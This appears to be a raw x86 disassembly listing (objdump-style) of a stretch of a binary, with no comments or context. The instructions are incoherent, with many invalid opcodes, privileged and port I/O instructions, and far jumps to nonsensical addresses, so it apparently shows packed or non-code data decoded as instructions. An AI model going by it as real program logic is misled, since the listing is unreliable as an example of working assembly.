  40b5db:	jp     0x40b562
  40b5dd:	cdq    
  40b5de:	ins    BYTE PTR es:[edi],dx
  40b5df:	ins    DWORD PTR es:[edi],dx
  40b5e0:	rol    DWORD PTR [eax-0x52db69ef],1
  40b5e6:	shl    BYTE PTR ds:0x48f1656d,1
  40b5ec:	xor    al,0x2e
  40b5ee:	add    eax,0xa125102b
  40b5f3:	es or  ecx,eax
  40b5f6:	bound  esi,QWORD PTR [ebx+ebx*4]
  40b5f9:	push   esp
  40b5fa:	scas   al,BYTE PTR es:[edi]
  40b5fb:	ror    ah,0x14
  40b5fe:	ss js  0x40b5e7
  40b601:	push   ss
  40b602:	jne    0x40b5a8
  40b604:	push   ebp
  40b605:	pop    ebx
  40b606:	into   
  40b607:	mov    ds:0x72b964e1,eax
  40b60c:	add    BYTE PTR [bx-0x176e],0xbc
  40b612:	ret    0x2b86
  40b615:	and    ebp,edi
  40b617:	pop    ss
  40b618:	dec    eax
  40b619:	ins    DWORD PTR es:[edi],dx
  40b61a:	call   0xdcbe36c1
  40b61f:	pop    edx
  40b620:	not    DWORD PTR [ebx+eiz*1+0x1d]
  40b624:	and    al,BYTE PTR [edx+0x4c]
  40b627:	dec    ebp
  40b628:	hlt    
  40b629:	sbb    edx,DWORD PTR [edi-0x7e]
  40b62c:	sub    ebp,DWORD PTR [eax-0x16]
  40b62f:	outs   dx,BYTE PTR ds:[esi]
  40b630:	adc    BYTE PTR [edi-0x71c38f9e],ch
  40b636:	fisub  DWORD PTR [edx]
  40b638:	outs   dx,DWORD PTR ss:[esi]
  40b63a:	sub    BYTE PTR [esi-0x2611bf76],0x70
  40b641:	into   
  40b642:	rcr    BYTE PTR [ebx],0x7e
  40b645:	cwde   
  40b646:	push   edx
  40b647:	mov    eax,0xf1b6e5f4
  40b64c:	aaa    
  40b64d:	stos   BYTE PTR es:[edi],al
  40b64e:	std    
  40b64f:	fs scas al,BYTE PTR es:[edi]
  40b651:	fisub  DWORD PTR [ebx]
  40b653:	out    0xc6,eax
  40b655:	inc    edx
  40b656:	lods   al,BYTE PTR ds:[esi]
  40b657:	push   ds
  40b658:	dec    eax
  40b659:	pop    esi
  40b65a:	lds    eax,FWORD PTR [ebx]
  40b65c:	mov    ecx,0xc0db15bc
  40b661:	or     DWORD PTR [edi+eax*1+0x73],esp
  40b665:	dec    edx
  40b666:	inc    esp
  40b667:	daa    
  40b668:	jae    0x40b663
  40b66a:	mov    dh,0xad
  40b66c:	push   ebp
  40b66d:	mov    ds:0x431d7714,al
  40b672:	push   es
  40b673:	div    BYTE PTR [eax+0x4bfbc2a3]
  40b679:	mov    edx,0xca0764f1
  40b67e:	gs push ss
  40b680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b681:	xchg   ebx,eax
  40b682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b683:	mov    ds:0xc078d0af,al
  40b688:	push   ss
  40b689:	fild   WORD PTR [esi+eax*4-0x53ac5510]
  40b690:	and    al,0x2a
  40b692:	mov    dh,0x88
  40b694:	rol    BYTE PTR [ecx+0x7f],1
  40b697:	fdiv   st,st(4)
  40b699:	stc    
  40b69a:	invd   
  40b69c:	arpl   dx,cx
  40b69e:	push   ecx
  40b69f:	je     0x40b657
  40b6a1:	or     DWORD PTR [esi-0x72],ebp
  40b6a4:	mov    ah,0xa2
  40b6a6:	out    dx,al
  40b6a7:	sub    bh,al
  40b6a9:	fldcw  WORD PTR [ebx+0x26cfc4b1]
  40b6af:	pop    ebp
  40b6b0:	icebp  
  40b6b1:	xchg   edx,eax
  40b6b2:	xchg   edx,eax
  40b6b3:	adc    ecx,esi
  40b6b5:	xchg   ebp,eax
  40b6b6:	mov    eax,ds:0x6d5cd585
  40b6bb:	sub    ebx,DWORD PTR [esi-0x3ad41311]
  40b6c1:	pop    ebp
  40b6c2:	and    ch,dh
  40b6c4:	loopne 0x40b719
  40b6c6:	mov    ebx,0xe38fccba
  40b6cb:	enter  0xdc00,0x1b
  40b6cf:	xor    BYTE PTR [ebx+0x6a209892],ah
  40b6d5:	xor    eax,0x852965d9
  40b6da:	cmc    
  40b6db:	dec    eax
  40b6dc:	mov    ch,0x8e
  40b6de:	bswap  ebx
  40b6e0:	pusha  
  40b6e1:	(bad)  
  40b6e3:	shl    dh,0x61
  40b6e6:	lods   al,BYTE PTR ds:[esi]
  40b6e7:	jmp    0xa892:0x5a49debb
  40b6ee:	sub    BYTE PTR [edx],cl
  40b6f0:	cmp    al,0x88
  40b6f2:	ret    0x7c18
  40b6f5:	xor    ebp,esp
  40b6f7:	lods   al,BYTE PTR ds:[esi]
  40b6f8:	lea    ebp,[ebp+0x19ff36c1]
  40b6fe:	xor    BYTE PTR [eax+0x4cc23bb1],ch
  40b704:	call   0x70da8b64
  40b709:	and    DWORD PTR ds:0x62a65ea2,ebp
  40b70f:	xor    eax,0x786bdb1
  40b714:	ins    DWORD PTR es:[edi],dx
  40b715:	daa    
  40b716:	xchg   edx,eax
  40b717:	mov    al,0xf2
  40b719:	add    ch,dh
  40b71b:	lock (bad) 
  40b71d:	cdq    
  40b71e:	in     al,dx
  40b71f:	ins    DWORD PTR es:[edi],dx
  40b720:	or     eax,0xad816dea
  40b725:	pop    ebx
  40b726:	ins    DWORD PTR es:[edi],dx
  40b727:	lock xchg DWORD PTR [ebx+0xf],eax
  40b72b:	mov    bl,BYTE PTR [edi+ebp*1]
  40b72e:	jg     0x40b6f8
  40b730:	sahf   
  40b731:	xchg   DWORD PTR [ebp-0xae44a15],ebx
  40b737:	pop    ds
  40b738:	mov    bl,0x33
  40b73a:	jnp    0x40b7ac
  40b73c:	dec    ebp
  40b73d:	and    DWORD PTR [edx+0x171808a1],ebp
  40b743:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b745:	test   al,0xe9
  40b747:	movsx  eax,BYTE PTR [ebx-0x7e224f8e]
  40b74e:	or     esi,edi
  40b750:	mov    bl,0xf8
  40b752:	and    eax,0x7aa853d1
  40b757:	mov    bl,0xf9
  40b759:	pushf  
  40b75a:	shl    edi,0xe0
  40b75d:	fs je  0x40b6f9
  40b760:	popf   
  40b761:	inc    eax
  40b762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b763:	call   0x6663b6f9
  40b768:	and    eax,0xec62e4c
  40b76d:	mov    esp,0x3e372930
  40b772:	cli    
  40b773:	gs or  al,0xa3
  40b776:	xchg   BYTE PTR [edi],dh
  40b778:	(bad)  
  40b779:	push   ss
  40b77a:	sbb    ebx,DWORD PTR [ebp+0x45f1d64b]
  40b780:	jbe    0x40b72f
  40b782:	test   al,0x2d
  40b784:	ss aam 0x18
  40b787:	rcl    al,cl
  40b789:	ss clc 
  40b78b:	sar    ebx,cl
  40b78d:	sub    eax,0x92803a8
  40b792:	test   eax,0x606e3844
  40b797:	mov    ds,WORD PTR [ecx]
  40b799:	mov    ch,bh
  40b79b:	call   0xccb893b1
  40b7a0:	pop    DWORD PTR [ecx+0x39]
  40b7a3:	(bad)  
  40b7a4:	mov    edx,0xbd6fdf56
  40b7a9:	add    BYTE PTR [edx+edx*1+0x5abb0364],ch
  40b7b0:	xlat   BYTE PTR ds:[ebx]
  40b7b1:	or     eax,DWORD PTR [eax-0x336c97b5]
  40b7b7:	adc    DWORD PTR [esi+ecx*8],ecx
  40b7ba:	sbb    al,0x7f
  40b7bc:	xchg   ebp,eax
  40b7bd:	(bad)  [esi+0x6c31a5f6]
  40b7c3:	pop    ebp
  40b7c4:	jae    0x40b800
  40b7c6:	xor    al,0xb8
  40b7c8:	ss inc edx
  40b7ca:	push   ebx
  40b7cb:	mov    edi,0x4fc20841
  40b7d0:	or     BYTE PTR [edx],bh
  40b7d2:	jmp    0x8249:0x8d354973
  40b7d9:	mov    esp,0x7fe4c426
  40b7de:	nop
  40b7df:	sbb    BYTE PTR [esi+esi*8+0x5d],ah
  40b7e3:	jle    0x40b7f0
  40b7e5:	mov    ch,0x16
  40b7e7:	cmp    eax,0x462c1cba
  40b7ec:	and    eax,0xd4e2633a
  40b7f1:	lds    ebp,FWORD PTR [edi-0x21eeb92f]
  40b7f7:	jno    0x40b872
  40b7f9:	add    cl,BYTE PTR [edi]
  40b7fb:	(bad)  
  40b7fc:	(bad)  
  40b7fd:	loopne 0x40b7ca
  40b7ff:	sub    dl,BYTE PTR [ecx+edi*1]
  40b802:	aad    0x92
  40b804:	cmp    eax,0xc7561c42
  40b809:	sbb    eax,0x40dc1d5
  40b80e:	lea    eax,[eax+0x3]
  40b811:	stc    
  40b812:	fisub  WORD PTR [esi-0x4d]
  40b815:	pop    edi
  40b816:	adc    al,0x14
  40b818:	jle    0x40b845
  40b81a:	les    edi,FWORD PTR [ecx]
  40b81c:	dec    ecx
  40b81d:	es sbb eax,esp
  40b820:	pop    es
  40b821:	sbb    DWORD PTR [edx-0x3d],eax
  40b824:	mov    eax,0x43e2e2cb
  40b829:	jb     0x40b7d3
  40b82b:	hlt    
  40b82c:	lea    edi,[ebp+0x50]
  40b82f:	jmp    0x40b84e
  40b831:	in     eax,0xd3
  40b833:	cmp    al,BYTE PTR [eax]
  40b835:	push   0x54
  40b837:	cmp    DWORD PTR [edx-0x17],0x26
  40b83b:	daa    
  40b83c:	stc    
  40b83d:	lock fild WORD PTR [edi]
  40b840:	sti    
  40b841:	pop    es
  40b842:	into   
  40b843:	mov    bh,0x56
  40b845:	jno    0x40b84c
  40b847:	mov    WORD PTR [edx+0x3f76ae7a],gs
  40b84d:	or     BYTE PTR [esi],dl
  40b84f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b850:	cmp    DWORD PTR ds:0x7c04315a,ebx
  40b856:	dec    edi
  40b857:	dec    edx
  40b858:	fs add edx,ecx
  40b85b:	jl     0x40b7e7
  40b85d:	pop    ds
  40b85e:	push   0x6b
  40b860:	cdq    
  40b861:	cdq    
  40b862:	mov    ecx,0x906227ea
  40b867:	arpl   WORD PTR [eax],di
  40b869:	add    BYTE PTR [ebp+0x17d2e238],0xed
  40b870:	and    ebx,esi
  40b872:	fistp  QWORD PTR [ebp+eiz*2+0x3e5eb4a8]
  40b879:	in     al,0x7a
  40b87b:	(bad)  
  40b87c:	hlt    
  40b87d:	and    BYTE PTR [edx+0x1a],cl
  40b880:	daa    
  40b881:	js     0x40b8d4
  40b883:	sbb    ebp,eax
  40b885:	jle    0x40b860
  40b887:	xchg   edi,eax
  40b888:	sbb    ebp,DWORD PTR ds:[edi+esi*4]
  40b88c:	shl    ah,cl
  40b88e:	jbe    0x40b851
  40b890:	clc    
  40b891:	dec    esi
  40b892:	jno    0x40b905
  40b894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b895:	jne    0x40b8eb
  40b897:	dec    ebp
  40b898:	call   0x4b4f:0xf821923e
  40b89f:	pushf  
  40b8a0:	mov    dh,0xa4
  40b8a2:	dec    ebx
  40b8a3:	(bad)  
  40b8a4:	data16 jo 0x40b917
  40b8a7:	jge    0x40b83d
  40b8a9:	sti    
  40b8aa:	pop    esp
  40b8ab:	ds inc eax
  40b8ad:	mov    WORD PTR [ebp-0x56152bb3],ss
  40b8b3:	adc    DWORD PTR [edx+ebp*4-0x58471b05],ebp
  40b8ba:	push   eax
  40b8bb:	outs   dx,BYTE PTR ds:[esi]
  40b8bc:	inc    esp
  40b8bd:	mov    dl,0xa7
  40b8bf:	xchg   ecx,eax
  40b8c0:	and    DWORD PTR [ebx],eax
  40b8c2:	mov    ebp,0xa3395b7c
  40b8c7:	inc    ebp
  40b8c8:	fs pop ecx
  40b8ca:	push   ebp
  40b8cb:	inc    edi
  40b8cc:	pop    ecx
  40b8cd:	xor    esi,DWORD PTR [edi]
  40b8cf:	xchg   ebp,eax
  40b8d0:	fsubr  st(1),st
  40b8d2:	sbb    BYTE PTR [edi-0x8865fb7],dh
  40b8d8:	jne    0x40b921
  40b8da:	sahf   
  40b8db:	xchg   esp,eax
  40b8dc:	jae    0x40b879
  40b8de:	dec    ecx
  40b8df:	dec    ecx
  40b8e0:	xor    DWORD PTR [edi-0x54],ecx
  40b8e3:	add    DWORD PTR [eax],edi
  40b8e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e6:	cli    
  40b8e7:	repz in eax,0xea
  40b8ea:	les    ebx,FWORD PTR [edi-0x51]
  40b8ed:	int    0x5f
  40b8ef:	jnp    0x40b8be
  40b8f1:	(bad)  
  40b8f2:	jge    0x40b940
  40b8f4:	add    DWORD PTR [edi+edx*4+0x32850a35],esi
  40b8fb:	cmp    edi,DWORD PTR [edi-0x8450e6]
  40b901:	inc    eax
  40b902:	xor    eax,0x4b5afa28
  40b907:	pop    eax
  40b908:	jmp    0xb11:0x5be81c3b
  40b90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b910:	leave  
  40b911:	rol    BYTE PTR [ecx],1
  40b913:	lahf   
  40b914:	adc    al,0x7a
  40b916:	dec    ebp
  40b917:	cmc    
  40b918:	dec    ecx
  40b919:	(bad)  
  40b91b:	fstp   DWORD PTR [ebp+0x4575435d]
  40b921:	in     eax,0x4
  40b923:	jl     0x40b8fe
  40b925:	push   edi
  40b926:	and    eax,0x696eb732
  40b92b:	sbb    DWORD PTR [esi-0x79],esi
  40b92e:	jns    0x40b93f
  40b930:	inc    esi
  40b931:	mov    eax,ds:0x39eb606e
  40b936:	rcl    DWORD PTR [ebx-0x69],0xe7
  40b93a:	xchg   DWORD PTR [edx+0x2d],ebx
  40b93d:	dec    eax
  40b93e:	pop    ds
  40b93f:	push   ds
  40b940:	cli    
  40b941:	out    dx,al
  40b942:	cmp    eax,0xc3c60b92
  40b947:	pop    esp
  40b948:	inc    eax
  40b949:	and    eax,DWORD PTR [ebx]
  40b94b:	jp     0x40b9b0
  40b94d:	dec    ecx
  40b94e:	inc    esi
  40b94f:	push   0xffffff86
  40b951:	inc    ebx
  40b952:	push   esp
  40b953:	push   esp
  40b954:	inc    edi
  40b955:	daa    
  40b956:	arpl   WORD PTR [ebp+0x54],dx
  40b959:	mov    eax,0x14675265
  40b95e:	push   ds
  40b95f:	pop    ss
  40b960:	shl    DWORD PTR [edx+0x5ff053da],cl
  40b966:	xchg   esi,eax
  40b967:	or     BYTE PTR [esi+0x37e38682],0xb4
  40b96e:	es mov edx,0x232af295
  40b974:	int3   
  40b975:	mov    ebp,0xc6ad0d1f
  40b97a:	int3   
  40b97b:	adc    bh,BYTE PTR [esi]
  40b97d:	push   ss
  40b97e:	xor    dl,BYTE PTR [edi]
  40b980:	imul   edi,DWORD PTR [ebp+0x30],0x666c872a
  40b987:	addr16 test al,0xb6
  40b98a:	fisubr DWORD PTR [ecx+0x2e]
  40b98d:	pop    esp
  40b98e:	mov    ah,0x33
  40b990:	mov    esp,0xe4408e2b
  40b995:	(bad)  
  40b996:	and    eax,0x6c160fc
  40b99b:	or     eax,0x183aa263
  40b9a0:	shl    DWORD PTR [ecx+ecx*2+0x32],1
  40b9a4:	add    BYTE PTR [edx+0x10],al
  40b9a7:	xchg   BYTE PTR [ebx+0x68e7aa26],dl
  40b9ad:	adc    al,0xc7
  40b9af:	jno    0x40b981
  40b9b1:	push   edx
  40b9b2:	lods   eax,DWORD PTR ds:[esi]
  40b9b3:	shl    DWORD PTR [esi+0x25],cl
  40b9b6:	mov    edx,0x2e19c547
  40b9bb:	push   ebp
  40b9bc:	out    dx,al
  40b9bd:	xor    DWORD PTR [esi-0x43],ebp
  40b9c0:	jecxz  0x40ba13
  40b9c2:	icebp  
  40b9c3:	outs   dx,DWORD PTR ds:[esi]
  40b9c4:	(bad)  
  40b9c6:	mov    ch,BYTE PTR [ebx+0x12]
  40b9c9:	daa    
  40b9ca:	scas   eax,DWORD PTR es:[edi]
  40b9cb:	pop    eax
  40b9cc:	push   ebp
  40b9cd:	jmp    0x40b963
  40b9cf:	add    DWORD PTR [ebx+0x7f],ecx
  40b9d2:	xor    dl,BYTE PTR [edi+0xed26d3]
  40b9d8:	mov    edi,0x5cb6fd88
  40b9dd:	addr16 pop edx
  40b9df:	xchg   ebx,eax
  40b9e0:	xor    eax,0x803a42a7
  40b9e5:	pop    ecx
  40b9e6:	retf   
  40b9e7:	rcl    dh,cl
  40b9e9:	jl     0x40ba0c
  40b9eb:	mov    ebx,0xf58fefc1
  40b9f0:	stos   BYTE PTR es:[edi],al
  40b9f1:	add    DWORD PTR [edi-0x40857797],eax
  40b9f7:	inc    BYTE PTR [ebx-0x554032e9]
  40b9fd:	and    BYTE PTR [ecx],ch
  40b9ff:	pop    ecx
  40ba00:	dec    ecx
  40ba01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba02:	fwait
  40ba03:	clc    
  40ba04:	call   0xfe50:0x1d26ef17
  40ba0b:	ror    DWORD PTR ds:0xd66888c5,0x8c
  40ba12:	pop    ds
  40ba13:	popf   
  40ba14:	mov    dh,0xa4
  40ba16:	push   cs
  40ba17:	std    
  40ba18:	js     0x40b9db
  40ba1a:	lods   eax,DWORD PTR gs:[esi]
  40ba1c:	sub    BYTE PTR [edi+eiz*4-0x80],ah
  40ba20:	aas    
  40ba21:	xor    DWORD PTR [ecx-0x25],eax
  40ba24:	jge    0x40b9bb
  40ba26:	cs xor eax,0x55f655ff
  40ba2c:	outs   dx,DWORD PTR ds:[esi]
  40ba2d:	daa    
  40ba2e:	push   esi
  40ba2f:	retf   0xa0df
  40ba32:	push   esi
  40ba33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba34:	dec    ecx
  40ba35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba36:	xor    BYTE PTR [ebx+0x671fb0ec],0xf2
  40ba3d:	addr16 mov al,ds:0x6aa8
  40ba41:	fisub  WORD PTR [ebx+0x73]
  40ba44:	enter  0xb6c2,0x1a
  40ba48:	xor    DWORD PTR [ebx+0x1d],edi
  40ba4b:	sub    BYTE PTR [eax+esi*2],0xc1
  40ba4f:	(bad)  
  40ba50:	jne    0x40bac5
  40ba52:	popf   
  40ba53:	repz inc esi
  40ba55:	push   0xf7800eae
  40ba5a:	add    ebp,DWORD PTR [ecx+eiz*2+0x17482e53]
  40ba61:	mov    bh,0x8d
  40ba63:	ins    DWORD PTR es:[edi],dx
  40ba64:	push   eax
  40ba65:	push   esp
  40ba66:	add    dl,cl
  40ba68:	push   es
  40ba69:	aam    0x25
  40ba6b:	sub    bl,bh
  40ba6d:	stos   BYTE PTR es:[edi],al
  40ba6e:	xchg   edx,eax
  40ba6f:	scas   eax,DWORD PTR es:[edi]
  40ba70:	iret   
  40ba71:	mov    ebx,0xd6a924d5
  40ba76:	js     0x40ba16
  40ba78:	adc    DWORD PTR [edx+0x4],0x4b
  40ba7c:	sub    eax,0xfa77e1a8
  40ba81:	rcr    BYTE PTR [edx],0xa9
  40ba84:	(bad)  
  40ba85:	mov    bl,0x3
  40ba87:	sti    
  40ba88:	std    
  40ba89:	arpl   ax,sp
  40ba8b:	xchg   ebx,eax
  40ba8c:	push   ebx
  40ba8d:	adc    cl,BYTE PTR [eax]
  40ba8f:	inc    ebx
  40ba90:	add    DWORD PTR [ebx+ebx*1+0x21dbc98c],eax
  40ba97:	ja     0x40bac7
  40ba99:	scas   al,BYTE PTR es:[edi]
  40ba9a:	cld    
  40ba9b:	xor    bl,ch
  40ba9d:	cli    
  40ba9e:	test   DWORD PTR [ebp+0x62f03e15],eax
  40baa4:	shl    DWORD PTR [edx-0x24],1
  40baa7:	mov    dl,0xe4
  40baa9:	call   0xc056fe31
  40baae:	lds    esi,FWORD PTR [esi]
  40bab0:	cmp    edx,DWORD PTR [ecx+0x75]
  40bab3:	lock pop ebx
  40bab5:	cmp    BYTE PTR [esi],bh
  40bab7:	xchg   BYTE PTR [eax+0x11],bh
  40baba:	sub    edi,DWORD PTR [edx-0x3bdea903]
  40bac0:	mov    esp,0x5f0c97d5
  40bac5:	xlat   BYTE PTR ds:[ebx]
  40bac6:	xchg   edx,eax
  40bac7:	dec    edi
  40bac8:	push   ds
  40bac9:	mov    ebp,DWORD PTR [eax-0x73]
  40bacc:	scas   eax,DWORD PTR es:[edi]
  40bacd:	inc    ecx
  40bace:	pop    ebx
  40bacf:	jg     0x40ba78
  40bad1:	mov    edi,0x40d0af4f
  40bad6:	pushf  
  40bad7:	(bad)  
  40bad8:	stos   DWORD PTR es:[edi],eax
  40bad9:	(bad)  
  40bada:	push   esi
  40badb:	test   eax,0x41d0b1d0
  40bae0:	and    eax,0x9b31c08d
  40bae5:	mov    ah,0xa0
  40bae7:	xchg   edi,eax
  40bae8:	jp     0x40bae2
  40baea:	sub    eax,0xfdbb32a7
  40baef:	(bad)  
  40baf1:	dec    ebx
  40baf2:	adc    ebp,DWORD PTR [esi-0x14f7675e]
  40baf8:	int    0x7
  40bafa:	popf   
  40bafb:	in     al,0x26
  40bafd:	cmp    ebx,edi
  40baff:	out    0x7f,eax
  40bb01:	jmp    0x7a1ac3f8
  40bb06:	scas   eax,DWORD PTR es:[edi]
  40bb07:	sub    ch,BYTE PTR [ebp*1-0x29eae553]
  40bb0e:	mov    dl,0x7b
  40bb10:	not    DWORD PTR [ecx-0x6c]
  40bb13:	je     0x40bac2
  40bb15:	sbb    ah,ah
  40bb17:	push   es
  40bb18:	sub    DWORD PTR [ecx-0x69e1b3c0],esi
  40bb1e:	and    ebx,eax
  40bb20:	popa   
  40bb21:	fild   DWORD PTR [esi]
  40bb23:	imul   ebp,esi,0xbfebfb3c
  40bb29:	add    ebx,DWORD PTR [esp+esi*2-0x61]
  40bb2d:	out    0xbd,al
  40bb2f:	clc    
  40bb30:	mov    cl,0x92
  40bb32:	cmc    
  40bb33:	lock call 0x5a19ad6d
  40bb39:	repnz (bad) 
  40bb3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb3c:	cmp    al,0x95
  40bb3e:	jecxz  0x40bb69
  40bb40:	cdq    
  40bb41:	adc    eax,0x22e1d23b
  40bb46:	mov    bh,0xd3
  40bb48:	mov    al,0xe4
  40bb4a:	fucompp 
  40bb4c:	out    dx,al
  40bb4d:	pushf  
  40bb4e:	push   esp
  40bb4f:	jnp    0x40bb2b
  40bb51:	cdq    
  40bb52:	xchg   esp,edx
  40bb54:	stc    
  40bb55:	jno    0x40bb19
  40bb57:	stos   DWORD PTR es:[edi],eax
  40bb58:	shl    BYTE PTR gs:[ecx],0x80
  40bb5c:	inc    esi
  40bb5d:	jno    0x40bb1a
  40bb5f:	mov    ebx,0xffeb04c8
  40bb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb65:	fld    DWORD PTR [esi]
  40bb67:	cwde   
  40bb68:	ret    0x412c
  40bb6b:	mov    ds:0xeb5093ea,eax
  40bb70:	cdq    
  40bb71:	inc    ebp
  40bb72:	xor    DWORD PTR [edx+0x4f],ebx
  40bb75:	dec    esi
  40bb76:	dec    esp
  40bb77:	enter  0xc09c,0x1a
  40bb7b:	xchg   ebp,eax
  40bb7c:	push   ebx
  40bb7d:	mov    edi,0x16f47f24
  40bb82:	jg     0x40bbed
  40bb84:	pop    ss
  40bb85:	add    DWORD PTR [ecx],esp
  40bb87:	sub    al,0x56
  40bb89:	mov    dh,0x77
  40bb8b:	jns    0x40bb1f
  40bb8d:	push   eax
  40bb8e:	add    DWORD PTR ds:0xf902865f,ebx
  40bb94:	(bad)  
  40bb96:	sub    al,0x88
  40bb98:	sub    BYTE PTR [edx],bl
  40bb9a:	call   0x27c09b3a
  40bb9f:	aad    0xcd
  40bba1:	cdq    
  40bba2:	pop    eax
  40bba3:	ficomp WORD PTR [ebp-0x50]
  40bba6:	stos   DWORD PTR es:[edi],eax
  40bba7:	sti    
  40bba8:	xchg   ebx,eax
  40bba9:	inc    esi
  40bbaa:	dec    ecx
  40bbab:	add    dh,bh
  40bbad:	shr    DWORD PTR [esi-0x28],1
  40bbb0:	xchg   ecx,eax
  40bbb1:	pop    edx
  40bbb2:	std    
  40bbb3:	xor    ebx,ecx
  40bbb5:	call   0x23f2e1fb
  40bbba:	or     esp,DWORD PTR [edx-0x2d6dcb56]
  40bbc0:	pop    ebx
  40bbc1:	add    eax,0x8b10c801
  40bbc6:	fdivr  DWORD PTR [ebp-0x47]
  40bbc9:	scas   al,BYTE PTR es:[edi]
  40bbca:	fsub   QWORD PTR [edx]
  40bbcc:	scas   al,BYTE PTR es:[edi]
  40bbcd:	jo     0x40bb60
  40bbcf:	jge    0x40bbc4
  40bbd1:	mov    esp,0x22a68fd3
  40bbd6:	cmp    eax,0x7442c164
  40bbdb:	in     al,0x12
  40bbdd:	fld    QWORD PTR [edx]
  40bbdf:	mov    fs,WORD PTR [eax]
  40bbe1:	ja     0x40bbc9
  40bbe3:	sub    DWORD PTR [ecx+0x25],esp
  40bbe6:	cs test al,0x21
  40bbe9:	push   ds
  40bbea:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbec:	js     0x40bc40
  40bbee:	sbb    dh,bh
  40bbf0:	jne    0x40bc0f
  40bbf2:	dec    edi
  40bbf3:	push   eax
  40bbf4:	push   ds
  40bbf5:	popa   
  40bbf6:	hlt    
  40bbf7:	loopne 0x40bc66
  40bbf9:	int    0x92
  40bbfb:	adc    edx,DWORD PTR [ebx-0x51]
  40bbfe:	jmp    0xdd8d657b
  40bc03:	out    dx,eax
  40bc04:	jbe    0x40bb91
  40bc06:	imul   esp,DWORD PTR [ebp+eiz*1-0x80],0xea3cc87b
  40bc0e:	mov    ebp,edi
  40bc10:	push   0x13e2d7dc
  40bc15:	xchg   BYTE PTR [eax+0x4f],bl
  40bc18:	mov    ds:0x60ef5b96,al
  40bc1d:	xor    eax,0x205cb291
  40bc22:	xchg   BYTE PTR [ecx+0x12babd11],ah
  40bc28:	outs   dx,BYTE PTR ds:[esi]
  40bc29:	dec    bp
  40bc2b:	xor    BYTE PTR [ecx-0x71],0xa4
  40bc2f:	pop    ecx
  40bc30:	aad    0x8e
  40bc32:	call   0x127493a6
  40bc37:	pushf  
  40bc38:	push   ebp
  40bc39:	cld    
  40bc3a:	xor    ebp,esi
  40bc3c:	mov    BYTE PTR [ebx+edi*4-0x11bbc890],al
  40bc43:	out    dx,ax
  40bc45:	mov    dh,0x94
  40bc47:	rol    DWORD PTR ds:0x2090ce32,cl
  40bc4d:	stos   DWORD PTR es:[edi],eax
  40bc4e:	jg     0x40bc78
  40bc50:	repz jl 0x40bc98
  40bc53:	sub    BYTE PTR [edx+0x72],dl
  40bc56:	pop    edx
  40bc57:	lods   eax,DWORD PTR ds:[esi]
  40bc58:	cmp    eax,esp
  40bc5a:	clc    
  40bc5b:	mov    es,WORD PTR [esi]
  40bc5d:	sbb    DWORD PTR [ebx],edi
  40bc5f:	hlt    
  40bc60:	and    DWORD PTR [ecx+ecx*1],eax
  40bc63:	(bad)  
  40bc64:	loope  0x40bca6
  40bc66:	stc    
  40bc67:	in     eax,dx
  40bc68:	sub    BYTE PTR [ebx-0x10],bh
  40bc6b:	sbb    bh,0x12
  40bc6e:	push   eax
  40bc6f:	lds    eax,FWORD PTR ss:[esp+edx*1+0x7225839c]
  40bc77:	mov    eax,DWORD PTR [eax+0x7bfa74ed]
  40bc7d:	in     eax,dx
  40bc7e:	mov    al,ds:0x4f4b12cb
  40bc83:	fld    st(0)
  40bc85:	adc    BYTE PTR [esi+0x60c5a6d5],bh
  40bc8b:	stos   DWORD PTR es:[edi],eax
  40bc8c:	into   
  40bc8d:	xor    DWORD PTR [ecx],eax
  40bc8f:	jmp    0x40bcad
  40bc91:	cmp    al,0x10
  40bc93:	inc    esi
  40bc94:	imul   ebp,DWORD PTR [edi],0xffffffe5
  40bc97:	or     BYTE PTR [ebp+0x9754a13],dl
  40bc9d:	cli    
  40bc9e:	push   esp
  40bc9f:	jge    0x40bd17
  40bca1:	jp     0x40bcb7
  40bca3:	jle    0x40bceb
  40bca5:	addr16 mov ah,0x9e
  40bca8:	xor    BYTE PTR [esi+0x78],bh
  40bcab:	loop   0x40bce5
  40bcad:	ss or  eax,0xfa37fd0b
  40bcb3:	pop    eax
  40bcb4:	repnz mov cl,0x4f
  40bcb7:	mov    cl,0x4c
  40bcb9:	jg     0x40bccc
  40bcbb:	sub    esi,edx
  40bcbd:	in     al,dx
  40bcbe:	test   BYTE PTR [esi+0x6fa6b9f],dl
  40bcc4:	jecxz  0x40bc48
  40bcc6:	push   ss
  40bcc7:	xchg   edi,eax
  40bcc8:	mov    DWORD PTR [ecx],esi
  40bcca:	mov    eax,ds:0x9c9ce072
  40bccf:	push   esp
  40bcd0:	cwde   
  40bcd1:	sti    
  40bcd2:	dec    eax
  40bcd3:	in     eax,0x60
  40bcd5:	mov    ah,0xcb
  40bcd7:	in     al,0x4
  40bcd9:	fsubr  QWORD PTR [ecx]
  40bcdb:	xchg   ecx,eax
  40bcdc:	loope  0x40bcdc
  40bcde:	sub    BYTE PTR [edx],0xe0
  40bce1:	js     0x40bcbc
  40bce3:	sbb    bx,di
  40bce6:	pop    esp
  40bce7:	imul   ecx,DWORD PTR [ebx],0xaa799eb7
  40bced:	mov    ss,ecx
  40bcef:	mov    ebp,0xdf3ac51
  40bcf4:	cmc    
  40bcf5:	adc    BYTE PTR [eax+edx*1],0x73
  40bcf9:	scas   eax,DWORD PTR es:[edi]
  40bcfa:	sbb    eax,0x6a883200
  40bcff:	cmp    BYTE PTR [ebp-0x68],ah
  40bd02:	xchg   al,bh
  40bd04:	vprotd ymm9,xmm5,xmm5
  40bd09:	data16 fisttp DWORD PTR [eax-0x4fb9e4aa]
  40bd10:	xor    bl,BYTE PTR [ebx+eax*8-0x1551673a]
  40bd17:	pop    esi
  40bd18:	cli    
  40bd19:	xor    bh,BYTE PTR [ecx-0x7cbe2d9c]
